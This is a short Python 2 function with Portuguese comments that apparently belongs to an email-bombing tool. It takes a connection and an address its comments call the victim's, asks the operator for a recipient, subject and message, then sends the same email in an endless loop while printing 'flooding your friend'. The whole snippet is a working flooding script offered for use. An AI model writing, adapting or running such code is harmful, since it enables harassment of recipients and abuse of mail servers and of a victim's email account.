def send_emails(email_user,conn):
    #Pega o e-mail da vítima
    FROM = email_user
    TO = raw_input('[!] INFORME O DESTINATÁRIO: ')

    #Escreve o e-mail
    SUBJECT = raw_input('[!] INFORME O ASSUNTO: ')
    text = raw_input('[!] ESCREVA UMA MENSAGEM: ')

    #Formata a mensagem nos padrões de envio SMTP
    message = MIMEMultipart()
    message['From'] = FROM
    message['To'] = TO
    message['Subject'] = SUBJECT
    message.attach(MIMEText(text, 'plain', 'utf-8'))
    email = message.as_string()

    #Envia o E-mail em looping
    while True:
        try:
            conn.sendmail(FROM, TO, email)
            print '[*] Floodando seu amigo... Pressione CTRL + C para cancelar'
        except:
            print '[x] Fail...'
            sys.exit()
